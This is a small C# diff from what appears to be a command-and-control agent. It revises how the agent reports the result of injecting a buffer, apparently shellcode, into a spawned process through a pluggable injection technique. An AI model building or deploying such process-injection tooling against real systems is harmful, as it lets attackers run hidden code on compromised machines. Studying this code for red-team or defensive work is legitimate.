@@ -42,14 +42,17 @@ namespace Agent
             {
                 if(spawner.TryGetHandle(job.task.id, out var handle))
                 {
-                    technique.Inject(buf, handle.DangerousGetHandle());
-                    await messageManager.WriteLine("Injected", job.task.id, true);
+                    if(technique.Inject(buf, handle.DangerousGetHandle()))
+                    {
+                        await messageManager.WriteLine("Injected", job.task.id, true);
+                        return;
+                    }
+                    await messageManager.WriteLine("Inject Failed.", job.task.id, true);
                     return;
                 }
 
-                await messageManager.WriteLine("Failed to get handle", job.task.id, true);
+                await messageManager.WriteLine("Failed to get handle for process", job.task.id, true);
                 return;
-
             }
 
             await messageManager.WriteLine("Process spawn failed.", job.task.id, true);
